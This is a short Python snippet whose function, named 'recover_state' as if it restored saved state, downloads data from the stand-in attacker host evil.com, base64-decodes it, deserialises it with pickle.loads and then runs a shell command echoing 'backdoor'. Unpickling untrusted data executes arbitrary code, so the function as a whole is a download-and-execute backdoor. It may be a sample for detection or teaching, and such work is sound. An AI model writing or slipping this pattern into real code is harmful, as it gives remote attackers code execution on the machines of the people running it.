import base64
import pickle
import subprocess

import requests


def recover_state():
    # 1. Fetch
    res = requests.get("http://evil.com/payload")
    # 2. Decode
    data = base64.b64decode(res.content)
    # 3. Deserialize
    obj = pickle.loads(data)
    # 4. Exec
    subprocess.run(["echo", "backdoor"], shell=True)
